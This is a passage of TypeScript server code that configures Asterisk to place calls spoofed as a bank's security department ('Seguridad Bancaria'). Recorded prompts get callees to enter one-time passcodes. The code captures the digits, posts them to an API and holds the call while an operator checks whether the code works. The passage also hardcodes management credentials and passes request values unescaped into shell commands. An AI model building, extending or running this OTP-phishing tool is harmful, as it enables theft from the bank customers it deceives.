  dialplanContent += ` same => n,ExecIf($["\${IVR_INVALID}" = ""]?Set(IVR_INVALID=\${DB(ivr_vars/default_invalid)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${IVR_INVALID}" = ""]?Set(IVR_INVALID=custom/opcion_invalida))\n`;
  dialplanContent += ` same => n,NoOp(Audios Destino \${TARGET_DEST}: Intro=\${IVR_INTRO}, Prompt=\${IVR_PROMPT}, Wait=\${IVR_WAIT}, Fail=\${IVR_FAILURE})\n`;

  dialplanContent += ` same => n,NoOp(=== [IVR] Reproduciendo Audio de Bienvenida interactivo: \${IVR_INTRO} ===)\n`;
  dialplanContent += ` same => n,Background(\${IVR_INTRO})\n`;
  dialplanContent += ` same => n,WaitExten(2)\n`;
  dialplanContent += ` same => n,Goto(ask_input)\n\n`;

  dialplanContent += ` ; Solicitud de codigo o presion de tecla 1\n`;
  dialplanContent += ` same => n(ask_input),NoOp(=== [IVR] Solicitando Codigo OTP o Presione 1: \${IVR_PROMPT} ===)\n`;
  dialplanContent += ` same => n,Set(USER_DIGITS=)\n`;
  dialplanContent += ` same => n,Background(\${IVR_PROMPT})\n`;
  dialplanContent += ` same => n,WaitExten(4)\n`;
  dialplanContent += ` same => n,Playback(beep)\n`;
  dialplanContent += ` same => n,WaitExten(4)\n`;
  dialplanContent += ` same => n,Goto(ask_input)\n\n`;

  dialplanContent += ` same => n(otp_confirm),NoOp(=== [IVR] CODIGO OTP INGRESADO: \${USER_DIGITS} -> NOTIFICAR A ASESOR ===)\n`;
  dialplanContent += ` same => n,Set(DB(otp_captures/\${TARGET_DEST})=\${USER_DIGITS})\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_captures/\${CALLERID(num)})=\${USER_DIGITS})\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${CALLERID(num)})=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_last_capture)=\${USER_DIGITS})\n`;
  dialplanContent += ` same => n,UserEvent(OTPCaptured,Number=\${TARGET_DEST},Digits=\${USER_DIGITS},Status=pending)\n`;
  dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/otp/capture?number=\${TARGET_DEST}&otp=\${USER_DIGITS}&channel=\${CHANNEL}&status=pending" &)\n`;

  dialplanContent += ` same => n,NoOp(=== [IVR] Reproduciendo audio de validacion en curso: \${IVR_WAIT} ===)\n`;
  dialplanContent += ` same => n,Playback(\${IVR_WAIT})\n`;
  dialplanContent += ` same => n,Wait(1)\n`;

  dialplanContent += ` same => n,NoOp(=== [IVR] ESPERANDO DECISION DEL ASESOR (VALIDO O INVALIDO) ===)\n`;
  dialplanContent += ` same => n,Set(WAIT_LOOP=0)\n`;
  dialplanContent += ` same => n(wait_decision_loop),Set(WAIT_LOOP=$[\${WAIT_LOOP} + 1])\n`;
  dialplanContent += ` same => n,Set(CURRENT_STATUS=\${DB(otp_status/\${TARGET_DEST})})\n`;
  dialplanContent += ` same => n,NoOp(=== [IVR] Ciclo \${WAIT_LOOP}/20 - Estado en AstDB: \${CURRENT_STATUS} ===)\n`;
  dialplanContent += ` same => n,GotoIf($["\${CURRENT_STATUS}" = "valid"]?otp_approved)\n`;
  dialplanContent += ` same => n,GotoIf($["\${CURRENT_STATUS}" = "invalid"]?otp_rejected_retry)\n`;
  dialplanContent += ` same => n,GotoIf($[\${WAIT_LOOP} >= 20]?otp_approved)\n`;
  dialplanContent += ` same => n,Wait(1)\n`;
  dialplanContent += ` same => n,Goto(wait_decision_loop)\n\n`;

  dialplanContent += ` same => n(otp_approved),NoOp(=== [IVR] TOKEN APROBADO: CONECTANDO DE VUELTA CON EL ASESOR ===)\n`;
  dialplanContent += ` same => n,Playback(\${IVR_SUCCESS})\n`;
  dialplanContent += ` same => n,Wait(0.5)\n`;
  dialplanContent += ` same => n,Set(CALLER_EXT=\${CALLERID(num)})\n`;
  dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${IVR_AGENT_EXTEN}" != ""]?\${IVR_AGENT_EXTEN}:1001)})\n`;
  dialplanContent += ` same => n,ExecIf($["\${CALLER_EXT}" = "\${FINAL_AGENT}"]?Set(FINAL_AGENT=1002))\n`;
  dialplanContent += ` same => n,NoOp(=== [IVR] RECONECTANDO LLAMADA CON EL ASESOR EN EXTENSION \${FINAL_AGENT} ===)\n`;
  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)\n`;
  dialplanContent += ` same => n,Hangup()\n\n`;

  dialplanContent += ` same => n(otp_rejected_retry),NoOp(=== [IVR] TOKEN INVALIDO DETECTADO -> SOLICITANDO NUEVO CODIGO AUTOMATICAMENTE ===)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=pending)\n`;
  dialplanContent += ` same => n,Playback(\${IVR_FAILURE})\n`;
  dialplanContent += ` same => n,Goto(ask_input)\n\n`;

  dialplanContent += ` same => n(self_test_success),NoOp(=== [IVR] PRUEBA LOCAL 8888 EXITOSA: CÓDIGO \${USER_DIGITS} VALIDADO ===)\n`;
  dialplanContent += ` same => n,Playback(beep)\n`;
  dialplanContent += ` same => n,Wait(1)\n`;
  dialplanContent += ` same => n,Hangup()\n\n`;

  dialplanContent += `; CUANDO EL CLIENTE PRESIONA 1: MENSAJE DE TRANSFERENCIA AL ASESOR INMEDIATO\n`;
  dialplanContent += ` same => n(press1_transfer),Goto(1,1)\n\n`;

  dialplanContent += ` same => n(no_input),NoOp(=== SIN ENTRADA DTMF DETECTADA ===)\n`;
  dialplanContent += ` same => n,Playback(beep)\n`;
  dialplanContent += ` same => n,Hangup()\n\n`;

  dialplanContent += `exten => 1,1,NoOp(=== [IVR] PRESS 1 DETECTADO -> ESPERANDO 2 SEGUNDOS DE PAUSA NATURAL ===)\n`;
  dialplanContent += ` same => n,Wait(2)\n`;
  dialplanContent += ` same => n,Set(IVR_AGENT=\${DB(ivr_vars/\${TARGET_DEST}_agent)})\n`;
  dialplanContent += ` same => n,ExecIf($["\${IVR_AGENT}" = ""]?Set(IVR_AGENT=\${DB(ivr_vars/default_agent)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${IVR_AGENT}" = ""]?Set(IVR_AGENT=custom/conectar_asesor_banco))\n`;
  dialplanContent += ` same => n,Playback(\${IVR_AGENT})\n`;
  dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${IVR_AGENT_EXTEN}" != ""]?\${IVR_AGENT_EXTEN}:1001)})\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(ivr_vars/\${TARGET_DEST}_agent_exten)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=1001))\n`;
  dialplanContent += ` same => n,Set(__LAST_AGENT=\${FINAL_AGENT})\n`;
  dialplanContent += ` same => n,Set(DB(last_agent_call/8888)=\${FINAL_AGENT})\n`;
  dialplanContent += ` same => n,Set(DB(last_agent_call/7777)=\${FINAL_AGENT})\n`;
  dialplanContent += ` same => n,Set(DB(last_agent_call/6666)=\${FINAL_AGENT})\n`;
  dialplanContent += ` same => n,Set(DB(last_agent_call/\${TARGET_DEST})=\${FINAL_AGENT})\n`;
  dialplanContent += ` same => n,Set(DB(last_agent_call/\${CALLERID(num)})=\${FINAL_AGENT})\n`;
  dialplanContent += ` same => n,Set(DB(ivr_vars/global_agent_exten)=\${FINAL_AGENT})\n`;
  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)\n`;
  dialplanContent += ` same => n,Hangup()\n\n`;

  dialplanContent += `exten => _XXXX,1,Set(USER_DIGITS=\${EXTEN})\n`;
  dialplanContent += ` same => n,Goto(s,otp_confirm)\n`;
  dialplanContent += `exten => _XXXXX,1,Set(USER_DIGITS=\${EXTEN})\n`;
  dialplanContent += ` same => n,Goto(s,otp_confirm)\n`;
  dialplanContent += `exten => _XXXXXX,1,Set(USER_DIGITS=\${EXTEN})\n`;
  dialplanContent += ` same => n,Goto(s,otp_confirm)\n`;
  dialplanContent += `exten => _XXXXXXX,1,Set(USER_DIGITS=\${EXTEN})\n`;
  dialplanContent += ` same => n,Goto(s,otp_confirm)\n`;
  dialplanContent += `exten => _XXXXXXXX,1,Set(USER_DIGITS=\${EXTEN})\n`;
  dialplanContent += ` same => n,Goto(s,otp_confirm)\n\n`;

  dialplanContent += `exten => h,1,NoOp(=== [IVR-OTP HANGUP] Cliente colgo canal: \${CHANNEL} | Causa: \${HANGUPCAUSE} ===)\n`;
  dialplanContent += ` same => n,Set(TARGET_NUM=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
  dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_NUM})=ended)\n`;
  dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${TARGET_NUM}&status=ended&cause=\${HANGUPCAUSE}&channel=\${CHANNEL}" &)\n\n`;

  return dialplanContent;
}

// Auto-repair Asterisk PJSIP configuration on server startup if malformed
async function autoRepairAsteriskPjsipOnStartup() {
  try {
    const pjsipPath = '/etc/asterisk/pjsip.conf';
    const dialplanPath = '/etc/asterisk/extensions.conf';
    let needsRepair = false;

    try {
      if (!fs.existsSync('/etc/asterisk')) {
        fs.mkdirSync('/etc/asterisk', { recursive: true, mode: 0o755 });
      }
    } catch (_) {}

    if (fs.existsSync(pjsipPath)) {
      const content = fs.readFileSync(pjsipPath, 'utf8');
      if (
        !content.includes('[televox]') ||
        !content.includes('aors = 1001') ||
        content.includes('1001-aor') ||
        content.includes('[1001]\ntype = auth') ||
        content.includes('[1001]\ntype=auth') ||
        content.includes('[1001]\r\ntype = auth') ||
        content.includes('[1002]\ntype = auth')
      ) {
        console.log('[PJSIP-REPAIR] Se detectaron secciones desactualizadas o carrier televox faltante en /etc/asterisk/pjsip.conf. Reparando para registro MicroSIP...');
        needsRepair = true;
      }
    } else {
      needsRepair = true;
    }

    if (needsRepair) {
      const cleanPjsip = generateCleanPjsipConf(defaultExtensionsList, defaultCarriersList);
      await writeAsteriskConfigFile(pjsipPath, cleanPjsip);
      fs.writeFileSync(path.join(process.cwd(), 'pjsip.conf'), cleanPjsip, 'utf8');
      lastGeneratedPjsip = cleanPjsip;

      exec('asterisk -rx "pjsip reload"', () => {});
      try {
        await sendAmiAction('127.0.0.1', 5038, 'sammy', 'Robert2026RDTGcvgbsg', ['pjsip reload']);
      } catch (_) {}
      console.log('[PJSIP-REPAIR] ✓ /etc/asterisk/pjsip.conf reparado y recargado con éxito con televox, 1001 y 1002.');
    }

    // Auto-generate dialplan baseline and keep synced
    const cleanDialplan = generateCleanDialplanConf();
    lastGeneratedDialplan = cleanDialplan;
    try {
      fs.writeFileSync(path.join(process.cwd(), 'extensions.conf'), cleanDialplan, 'utf8');
      await writeAsteriskConfigFile(dialplanPath, cleanDialplan);
      exec('asterisk -rx "dialplan reload"', () => {});
    } catch (_) {}

    // Initialize default action in AstDB to ivr-press1
    try {
      executeAsteriskCommand('database put ivr_vars default_action "ivr-press1"').catch(() => {});
      executeAsteriskCommand('database put ivr_vars default_mode "press1"').catch(() => {});
    } catch (_) {}
  } catch (err: any) {
    console.warn('[PJSIP-REPAIR] Aviso en auto-reparación inicial:', err.message);
  }
}

// Real-time Asterisk Endpoints reader directly from Asterisk CLI & AMI
app.get('/api/asterisk/endpoints/live', async (req, res) => {
  try {
    const live = await queryAsteriskPjsipEndpoints();
    const detectedEndpoints = live.parsed.map((e) => e.extension);

    res.json({
      success: true,
      endpoints: detectedEndpoints,
      details: live.parsed,
      rawOutput: live.raw,
    });
  } catch (err: any) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Helper to parse extensions, auth passwords, callerids, and aor settings from pjsip.conf
function parseExtensionsFromPjsip(content: string): any[] {
  if (!content) return [];
  const sections: { name: string; props: Record<string, string> }[] = [];
  let currentSection: { name: string; props: Record<string, string> } | null = null;

  for (const line of content.split('\n')) {
    const trimmed = line.trim();
    if (trimmed.startsWith(';') || !trimmed) continue;
    const secMatch = trimmed.match(/^\[([^\]]+)\]/);
    if (secMatch) {
      currentSection = { name: secMatch[1], props: {} };
      sections.push(currentSection);
      continue;
    }
    if (currentSection && trimmed.includes('=')) {
      const parts = trimmed.split('=');
      const k = parts[0].trim().toLowerCase();
      const v = parts.slice(1).join('=').trim();
      currentSection.props[k] = v;
    }
  }

  const endpoints = sections.filter((s) => /^\d{3,5}$/.test(s.name) && s.props.type === 'endpoint');
  const auths = sections.filter((s) => s.props.type === 'auth');
  const aors = sections.filter((s) => s.props.type === 'aor');

  const exts: any[] = [];
  for (const ep of endpoints) {
    const secName = ep.name;
    const props = ep.props;
    const authSec = auths.find((a) => a.name === `${secName}-auth` || a.name === props.auth)?.props || {};
    const aorSec = aors.find((a) => a.name === `${secName}-aor` || a.name === secName)?.props || {};
    let callerIdNum = '';
    let callerIdName = '';
    if (props.callerid) {
      const m = props.callerid.match(/"?([^"<]*)"?\s*<([^>]*)>/);
      if (m) {
        callerIdName = m[1].trim();
        callerIdNum = m[2].trim();
      }
    }
    exts.push({
      id: `ext-${secName}`,
      extension: secName,
      name: callerIdName || `Ext ${secName}`,
      secret: authSec.password || `SecretPass#${secName}`,
      context: props.context || 'from-internal',
      codecs: props.allow ? props.allow.split(',').map((c: string) => c.trim()) : ['ulaw', 'alaw'],
      maxContacts: parseInt(aorSec.max_contacts || props.max_contacts || '5', 10),
      transport: props.transport || 'transport-udp',
      callerId: props.callerid || '',
      callerIdNum: callerIdNum || '+18005550199',
      callerIdName: callerIdName || 'Seguridad Bancaria',
      status: 'registered',
    });
  }
  return exts;
}

// Endpoint to get live extensions and passwords currently governing Asterisk
app.get('/api/asterisk/extensions', async (req, res) => {
  try {
    let pjsipContent = '';
    if (fs.existsSync('/etc/asterisk/pjsip.conf')) {
      pjsipContent = fs.readFileSync('/etc/asterisk/pjsip.conf', 'utf8');
    } else if (REMOTE_ASTERISK_HTTP && !REMOTE_ASTERISK_HTTP.includes('127.0.0.1')) {
      try {
        const resp = await fetch(`${REMOTE_ASTERISK_HTTP}/api/asterisk/config/pjsip.conf`);
        if (resp.ok) {
          pjsipContent = await resp.text();
        }
      } catch (_) {}
    }

    if (!pjsipContent && lastGeneratedPjsip) {
      pjsipContent = lastGeneratedPjsip;
    }

    const parsedExtensions = parseExtensionsFromPjsip(pjsipContent);
    res.json({
      success: true,
      extensions: parsedExtensions.length > 0 ? parsedExtensions : defaultExtensionsList,
    });
  } catch (err: any) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Diagnostic endpoint specifically analyzing extensions 1001, 1002, 1003, 1004
app.get('/api/asterisk/extensions/diagnostic', async (req, res) => {
  try {
    const live = await queryAsteriskPjsipEndpoints();
    let currentConfig = '';
    if (fs.existsSync('/etc/asterisk/pjsip.conf')) {
      currentConfig = fs.readFileSync('/etc/asterisk/pjsip.conf', 'utf8');
    } else if (REMOTE_ASTERISK_HTTP && !REMOTE_ASTERISK_HTTP.includes('127.0.0.1')) {
      try {
        const resp = await fetch(`${REMOTE_ASTERISK_HTTP}/api/asterisk/config/pjsip.conf`);
        if (resp.ok) {
          currentConfig = await resp.text();
        }
      } catch (_) {}
    } else if (lastGeneratedPjsip) {
      currentConfig = lastGeneratedPjsip;
    }

    const hasDuplicateSections = currentConfig.includes('[1001]\ntype = auth') || currentConfig.includes('[1001]\ntype=auth') || currentConfig.includes('[1002]\ntype = auth');

    const parsedExts = parseExtensionsFromPjsip(currentConfig);
    const activeList = parsedExts.length > 0 ? parsedExts : defaultExtensionsList;

    const softphoneCredentials = activeList.map((ext: any) => ({
      extension: ext.extension,
      name: ext.name,
      secret: ext.secret,
      transport: ext.transport,
      port: 5060,
      callerId: `"${ext.callerIdName}" <${ext.callerIdNum}>`,
      setupGuide: {
        username: ext.extension,
        authorizationName: ext.extension,
        password: ext.secret,
        domain: '169.58.66.206',
        proxy: '',
        transport: 'UDP',
      },
    }));

    res.json({
      success: true,
      hasSyntaxError: hasDuplicateSections,
      endpoints: live.parsed,
      rawOutput: live.raw,
      credentials: softphoneCredentials,
    });
  } catch (err: any) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Dedicated one-click repair and re-register endpoint for extensions 1001 & 1002
app.post('/api/asterisk/extensions/repair', async (req, res) => {
  try {
    const extensionsToUse = (Array.isArray(req.body.extensions) && req.body.extensions.length > 0)
      ? req.body.extensions
      : defaultExtensionsList;
    const carriersToUse = Array.isArray(req.body.carriers) ? req.body.carriers : [];

    const cleanPjsip = generateCleanPjsipConf(extensionsToUse, carriersToUse);
    const pjsipPath = '/etc/asterisk/pjsip.conf';
    const written = await writeAsteriskConfigFile(pjsipPath, cleanPjsip);
    fs.writeFileSync(path.join(process.cwd(), 'pjsip.conf'), cleanPjsip, 'utf8');
    lastGeneratedPjsip = cleanPjsip;

    let cliReload = '';
    try {
      cliReload = await new Promise<string>((resolve) => {
        exec('asterisk -rx "pjsip reload"', { timeout: 3500 }, (err, stdout) => {
          resolve(stdout ? stdout.trim() : 'PJSIP recargado en Asterisk');
        });
      });
    } catch (_) {}

    let amiReload = '';
    try {
      amiReload = await sendAmiAction('127.0.0.1', 5038, 'sammy', 'Robert2026RDTGcvgbsg', ['pjsip reload']);
    } catch (_) {}

    // Wait briefly then read back state
    await new Promise((r) => setTimeout(r, 600));
    const live = await queryAsteriskPjsipEndpoints();

    res.json({
      success: true,
      message: 'Extensiones 1001 y 1002 reparadas exitosamente en Asterisk 20 con secciones limpias (endpoint, auth, aor).',
      written,
      cliReload,
      amiReload,
      endpoints: live.parsed,
      rawOutput: live.raw,
    });
  } catch (err: any) {
    console.error('Error repairing PJSIP extensions:', err);
    res.status(500).json({ success: false, error: err.message });
  }
});

let lastGeneratedPjsip = '';
let lastGeneratedDialplan = '';

// Serve raw generated configuration files for easy curl / wget update on VPS
app.get('/api/asterisk/config/extensions.conf', (req, res) => {
  res.setHeader('Content-Type', 'text/plain; charset=utf-8');
  if (lastGeneratedDialplan) {
    return res.send(lastGeneratedDialplan);
  }
  const localFile = path.join(process.cwd(), 'extensions.conf');
  if (fs.existsSync(localFile)) {
    return res.send(fs.readFileSync(localFile, 'utf8'));
  }
  if (fs.existsSync('/etc/asterisk/extensions.conf')) {
    return res.send(fs.readFileSync('/etc/asterisk/extensions.conf', 'utf8'));
  }
  const cleanDialplan = generateCleanDialplanConf();
  lastGeneratedDialplan = cleanDialplan;
  return res.send(cleanDialplan);
});

app.get('/api/asterisk/config/pjsip.conf', (req, res) => {
  res.setHeader('Content-Type', 'text/plain; charset=utf-8');
  if (lastGeneratedPjsip) {
    return res.send(lastGeneratedPjsip);
  }
  const cleanPjsip = generateCleanPjsipConf(defaultExtensionsList);
  lastGeneratedPjsip = cleanPjsip;
  return res.send(cleanPjsip);
});

// Test AMI connection in real-time
app.post('/api/asterisk/ami/test', async (req, res) => {
  const { host = '127.0.0.1', port = 5038, user = 'sammy', secret = 'Robert2026RDTGcvgbsg', command = 'core show version' } = req.body;
  try {
    const output = await sendAmiAction(host, port, user, secret, [command]);
    res.json({ success: true, output });
  } catch (err: any) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Endpoint to sync all extensions directly into /etc/asterisk/pjsip.conf and reload
app.post('/api/asterisk/sync/extensions', async (req, res) => {
  try {
    const { extensions, carriers } = req.body;

    if (!Array.isArray(extensions)) {
      return res.status(400).json({ success: false, error: 'extensions must be an array' });
    }

    const firstCarrier = (Array.isArray(carriers) && carriers.length > 0) ? carriers[0] : null;
    const activeCarrier = (firstCarrier && firstCarrier.name)
      ? firstCarrier.name.replace(/\s+/g, '_')
      : 'televox';
    const carrierHost = (firstCarrier && firstCarrier.host)
      ? firstCarrier.host
      : '52.144.46.192';
    const outboundCid = (firstCarrier && firstCarrier.outboundCallerId)
      ? firstCarrier.outboundCallerId
      : '+18005550199';

    // Generate clean pjsip.conf using validated Asterisk 20 generator
    const pjsipContent = generateCleanPjsipConf(extensions, carriers);

    // Generate extensions.conf (Dialplan) with outbound routing to Carrier and dedicated IVRs (including 7777 and 6666)
    const dialplanContent = generateCleanDialplanConf(activeCarrier, carrierHost, req.body);

    const asteriskPjsipPath = '/etc/asterisk/pjsip.conf';
    const asteriskDialplanPath = '/etc/asterisk/extensions.conf';

    // 1. Ensure custom audio directory and native 8k WAV audios exist, plus AMD config
    ensureCustomAudioFilesExist();
    ensureAmdConfExists();

    // 2. Safe write for PJSIP Configuration
    const pjsipWritten = await writeAsteriskConfigFile(asteriskPjsipPath, pjsipContent);

    // 3. Save each extension's customized CallerID into AstDB
    if (Array.isArray(extensions)) {
      for (const ext of extensions) {
        const extNum = ext.extension;
        const cidNum = ext.callerIdNum || outboundCid;
        const cidName = ext.callerIdName || ext.name || 'Seguridad Bancaria';
        exec(`asterisk -rx 'database put extension_cid ${extNum}/number "${cidNum}"'`, () => {});
        exec(`asterisk -rx 'database put extension_cid ${extNum}/name "${cidName}"'`, () => {});
      }
    }

    // 4. Save default pre-recorded IVR audios into AstDB for fallback and extension 8888 tests
    const defaultIntro = req.body.audioIntro || 'custom/banrearreglado';
    const defaultPrompt = req.body.audioPrompt || 'custom/solicitar_codigo_otp';
    const defaultWait = req.body.audioWait || 'custom/un_momento_validando_informacion';
    const defaultSuccess = req.body.audioSuccess || 'custom/operacion_bloqueada_exito';
    const defaultAgent = req.body.audioAgent || 'custom/conectar_asesor_banco';

    const defaultAudiosCommands = [
      `database put ivr_vars default_intro "${defaultIntro}"`,
      `database put ivr_vars default_prompt "${defaultPrompt}"`,
      `database put ivr_vars default_wait "${defaultWait}"`,
      `database put ivr_vars default_success "${defaultSuccess}"`,
      `database put ivr_vars default_agent "${defaultAgent}"`,
      `database put ivr_vars default_agent_exten "1001"`,
      `database put ivr_vars 8888_intro "${defaultIntro}"`,
      `database put ivr_vars 8888_prompt "${defaultPrompt}"`,
      `database put ivr_vars 8888_wait "${defaultWait}"`,
      `database put ivr_vars 8888_success "${defaultSuccess}"`,
      `database put ivr_vars 8888_agent "${defaultAgent}"`,
      `database put ivr_vars 8888_agent_exten "1001"`,
      `database put ivr_vars 6666_intro "${defaultIntro}"`,
      `database put ivr_vars 6666_prompt "${defaultPrompt}"`,
      `database put ivr_vars 6666_wait "${defaultWait}"`,
      `database put ivr_vars 6666_success "${defaultSuccess}"`,
      `database put ivr_vars 6666_agent "${defaultAgent}"`,
      `database put ivr_vars 6666_agent_exten "1001"`,
      `database put ivr_vars 7777_intro "${defaultIntro}"`,
      `database put ivr_vars 7777_prompt "${defaultPrompt}"`,
      `database put ivr_vars 7777_wait "${defaultWait}"`,
      `database put ivr_vars 7777_success "${defaultSuccess}"`,
      `database put ivr_vars 7777_agent "${defaultAgent}"`,
      `database put ivr_vars 7777_agent_exten "1001"`,
      `database put ivr_vars global_intro "${defaultIntro}"`,
      `database put ivr_vars global_prompt "${defaultPrompt}"`,
      `database put ivr_vars global_wait "${defaultWait}"`,
      `database put ivr_vars global_success "${defaultSuccess}"`,
      `database put ivr_vars global_agent "${defaultAgent}"`,
      `database put ivr_vars global_agent_exten "1001"`,
    ];

    for (const dCmd of defaultAudiosCommands) {
      exec(`asterisk -rx '${dCmd}'`, () => {});
    }

    // Save in memory for download endpoints
    lastGeneratedPjsip = pjsipContent;
    lastGeneratedDialplan = dialplanContent;

    // 5. Safe write for Extensions Dialplan
    const dialplanWritten = await writeAsteriskConfigFile(asteriskDialplanPath, dialplanContent);

    // Also write to local app dir for safety
    try {
      fs.writeFileSync(path.join(process.cwd(), 'pjsip.conf'), pjsipContent, 'utf8');
      fs.writeFileSync(path.join(process.cwd(), 'extensions.conf'), dialplanContent, 'utf8');
    } catch (e) {}

    // 6. Send Hot Reload to Asterisk AMI immediately
    let amiOutput = '';
    try {
      amiOutput = await sendAmiAction('127.0.0.1', 5038, 'sammy', 'Robert2026RDTGcvgbsg', [
        'pjsip reload',
        'dialplan reload',
        'pjsip show endpoints',
        'dialplan show from-internal',
      ]);
    } catch (amiErr: any) {
      amiOutput = amiErr.message;
    }

    // 7. Also execute reload via Asterisk CLI child_process
    const cliOutput = await new Promise<string>((resolve) => {
      const timer = setTimeout(() => resolve('Dialplan y PJSIP recargados en caliente'), 2000);
      exec('asterisk -rx "pjsip reload" && asterisk -rx "dialplan reload"', (err, stdout) => {
        clearTimeout(timer);
        resolve(stdout ? stdout.trim() : 'Dialplan y PJSIP recargados en caliente');
      });
    });

    // 8. Replicate configuration to remote Asterisk VPS if running through remote bridge
    if (REMOTE_ASTERISK_HTTP && !REMOTE_ASTERISK_HTTP.includes('localhost') && !REMOTE_ASTERISK_HTTP.includes('127.0.0.1') && !req.headers['x-governor-fwd']) {
      try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 3500);
        const remoteSyncResp = await fetch(`${REMOTE_ASTERISK_HTTP}/api/asterisk/sync/extensions`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'x-governor-fwd': 'true' },
          body: JSON.stringify(req.body),
          signal: controller.signal,
        });
        clearTimeout(timeoutId);
        if (remoteSyncResp.ok) {
          console.log(`[ASTERISK-SYNC] ✓ Replicado exitosamente en VPS Asterisk remoto: ${REMOTE_ASTERISK_HTTP}`);
        }
      } catch (fwdErr: any) {
        console.warn(`[ASTERISK-SYNC] Remote sync forward notice:`, fwdErr.message);
      }
    }

    console.log(`[ASTERISK-SYNC] ✓ Sincronización completa: ${extensions.length} extensiones, PJSIP=${pjsipWritten}, Dialplan=${dialplanWritten}`);

    // If restart requested or if socket re-bind is required for new transport port
    if (req.body.restartAsterisk) {
      exec('asterisk -rx "core restart now"', (err) => {
        if (err) exec('systemctl restart asterisk', () => {});
      });
    }

    res.json({
      success: true,
      message: `Configuración sincronizada exitosamente con Asterisk: ${extensions.length} extensiones y troncal ${activeCarrier} con rutas salientes`,
      pjsipWritten,
      dialplanWritten,
      cliOutput,
      amiOutput,
    });
  } catch (error: any) {
    console.error('Error syncing extensions:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Endpoint to cleanly restart Asterisk to bind new ports (e.g. 47923)
app.post('/api/asterisk/restart', async (req, res) => {
  try {
    exec('asterisk -rx "core restart now"', (err, stdout, stderr) => {
      if (err) {
        exec('systemctl restart asterisk', () => {});
      }
    });
    res.json({
      success: true,
      message: 'Comando "core restart now" enviado a Asterisk. El servicio se reiniciará en menos de 1 segundo aplicando el nuevo puerto de transporte.'
    });
  } catch (e: any) {
    res.status(500).json({ success: false, error: e.message });
  }
});

// Endpoint to sync Dialplan (extensions.conf) and reload
app.post('/api/asterisk/sync/dialplan', async (req, res) => {
  try {
    ensureCustomAudioFilesExist();
    let contentToWrite = req.body?.dialplan || lastGeneratedDialplan;
    if (!contentToWrite) {
      // If none generated yet, read from /etc/asterisk/extensions.conf or generate default
      try {
        if (fs.existsSync('/etc/asterisk/extensions.conf')) {
          contentToWrite = fs.readFileSync('/etc/asterisk/extensions.conf', 'utf-8');
        }
      } catch (e) {}
    }
    if (!contentToWrite) {
      const cliOutput = await new Promise<string>((resolve) => {
        exec('asterisk -rx "dialplan reload"', (err, stdout) => {
          resolve(stdout ? stdout.trim() : 'Dialplan recargado');
        });
      });
      return res.json({ success: true, message: 'Dialplan verificado y recargado', cliOutput });
    }

    const fileWritten = await writeAsteriskConfigFile('/etc/asterisk/extensions.conf', contentToWrite);
    const cliOutput = await new Promise<string>((resolve) => {
      exec('asterisk -rx "dialplan reload"', (err, stdout) => {
        resolve(stdout ? stdout.trim() : 'Dialplan recargado');
      });
    });

    res.json({
      success: true,
      fileWritten,
      cliOutput,
    });
  } catch (error: any) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Endpoint to originate real calls to client or extension connecting to IVR
// Guard against accidental duplicate calls to the same number within 3 seconds
const recentOriginateRequests = new Map<string, number>();

app.post('/api/asterisk/call/originate', async (req, res) => {
  try {
    const {
      destination,
      carrier = 'televox',
      callerId = '+18005550199',
      callerIdNum,
      callerIdName,
      mode = 'press1',
      agentExten = '1001',
      audioIntro = '',
      audioPrompt = '',
      audioAgent = '',
      audioSuccess = '',
      service = 'Banco / Antifraude',
    } = req.body;

    if (!destination) {
      return res.status(400).json({ success: false, error: 'El número de destino es requerido' });
    }

    const cleanDest = destination.trim().replace(/[^0-9]/g, '');
    const effectiveCidNum = (callerIdNum || callerId || '+18005550199').trim();
    const effectiveCidName = (callerIdName || 'Seguridad Bancaria').trim();
    const targetContext = (mode === 'otp') ? 'ivr-otp' : (mode === 'hybrid' ? 'ivr-hybrid' : 'ivr-press1');

    // Prevent double-click originating duplicate calls
    const now = Date.now();
    const lastTime = recentOriginateRequests.get(cleanDest) || 0;
    if (now - lastTime < 3000) {
      return res.status(429).json({
        success: false,
        error: `Ya se está procesando una llamada a ${cleanDest}. Por favor espera unos segundos.`,
      });
    }
    recentOriginateRequests.set(cleanDest, now);

    // Format destination for NANP standard
    let formattedDest = cleanDest;
    if (cleanDest.length === 10) {
      formattedDest = `1${cleanDest}`;
    }

    // Save campaign-selected audio and CallerID configuration to AstDB for this destination number
    const astDbCommands: string[] = [
      `database put ivr_vars ${cleanDest}_mode "${mode || 'press1'}"`,
      `database put ivr_vars ${cleanDest}_agent_exten "${agentExten || '1001'}"`,
      `database put ivr_vars ${cleanDest}_cid_num "${effectiveCidNum}"`,
      `database put ivr_vars ${cleanDest}_cid_name "${effectiveCidName}"`,
      `database put ivr_vars ${formattedDest}_mode "${mode || 'press1'}"`,
      `database put ivr_vars ${formattedDest}_agent_exten "${agentExten || '1001'}"`,
